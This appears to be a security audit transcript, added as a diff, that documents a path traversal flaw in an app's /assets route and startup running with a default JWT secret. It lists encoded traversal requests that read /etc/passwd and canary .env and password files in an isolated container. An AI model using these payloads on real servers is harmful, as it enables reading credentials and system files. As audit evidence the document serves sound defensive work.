@@ -1,0 +1,50 @@
+IF-T037..IF-T041 / IF-T042..IF-T043 -- transcripts (2026-10-15)
+
+Environment: a THROW-AWAY container of the ckam-sec api image (`docker run -d --name ckam-sec-infra-audit
+--network none --entrypoint sleep ckam-sec-api 3600`, removed afterwards). No database, no network. uvicorn
+started inside it on 127.0.0.1:8000 with the production-style single-port setting FRONTEND_DIST_DIR.
+The running ckam-sec stack itself has FRONTEND_DIST_DIR unset (nginx serves the SPA) and answers 404.
+
+---------------------------------------------------------------------------------------------------------
+A. Path traversal on GET /assets/{file_path:path}   (backend/app/main.py:197-210)
+   FRONTEND_DIST_DIR=/tmp/dist ; canary /tmp/secret_outside.txt is OUTSIDE the dist dir
+   script: raw/probe_dist.py  (raw http.client request line, no client-side normalisation)
+
+Run 1 and run 2 (identical):
+status  leak  path                                            first bytes
+200     -     /assets/a.js                                    b'ok'
+200     LEAK  /assets/../../secret_outside.txt                b'OUTSIDE-DIST-CANARY'
+200     LEAK  /assets/..%2f..%2fsecret_outside.txt            b'OUTSIDE-DIST-CANARY'
+200     LEAK  /assets/%2e%2e/%2e%2e/secret_outside.txt        b'OUTSIDE-DIST-CANARY'
+200     LEAK  /assets/..%2F..%2F..%2Fetc%2Fpasswd             b'root:x:0:0:root:/root:/bin/bash\ndaemon:x'
+200     LEAK  /assets/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd b'root:x:0:0:root:/root:/bin/bash\ndaemon:x'
+404     -     /assets/....//....//secret_outside.txt
+200     LEAK  /assets//etc/passwd                             b'root:x:0:0:root:/root:/bin/bash\ndaemon:x'   (absolute path replaces the base)
+200     LEAK  /assets/%2fetc%2fpasswd                         b'root:x:0:0:root:/root:/bin/bash\ndaemon:x'
+200     -     /..%2f..%2fsecret_outside.txt                   b'<html>shell</html>'  (catch-all route is safe)
+200     -     /api/health
+200     -     /docs, /redoc, /openapi.json                    (interactive API docs are served in this mode)
+
+B. Production folder layout simulation (PRODUCTION_INFRASTRUCTURE.md: <root>\releases\<sha>\frontend-dist,
+   <root>\shared\.env, <root>\shared\nas.pw). FAKE canary values only.
+   FRONTEND_DIST_DIR=/tmp/root/releases/abc/frontend-dist
+GET /assets/..%2f..%2f..%2f..%2fshared%2f.env   -> 200 b'JWT_SECRET=FAKE-CANARY-NOT-REAL\nDATABASE_URL=postgresql+asyncpg://ckassetapp:FAKE@10.0.0.205/x\n'
+GET /assets/..%2f..%2f..%2f..%2fshared%2fnas.pw -> 200 b'FAKE-NAS-CANARY'
+
+C. Same request against the ckam-sec stack (FRONTEND_DIST_DIR unset):
+GET http://127.0.0.1:8200/assets/..%2f..%2f..%2fetc%2fpasswd -> 404
+GET http://localhost:3411/assets/..%2f..%2f..%2fetc%2fpasswd (nginx) -> 400
+
+---------------------------------------------------------------------------------------------------------
+D. Startup validation with development defaults while ENVIRONMENT_NAME=production
+Run 1: -e ENVIRONMENT_NAME=production -e JWT_SECRET=<the committed dev default> -e DATABASE_URL=<dev default URL>
+       -e COOKIE_SECURE=false
+  WARNING: [ckam.security] SECURITY WARNING: JWT_SECRET is insecure -- it is a committed placeholder value ('***').
+  WARNING: [ckam.system] The database is at migration None ...
+  INFO:     Application startup complete.
+  INFO:     Uvicorn running on http://127.0.0.1:8000
+Run 2: -e ENVIRONMENT_NAME=production and JWT_SECRET NOT SET AT ALL (falls back to the committed default)
+  SECURITY WARNING: JWT_SECRET is insecure -- it is a committed placeholder value ('***').
+  INFO:     Application startup complete.
+  INFO:     Uvicorn running on http://127.0.0.1:8001
+=> the process starts and serves requests; only a log line warns.
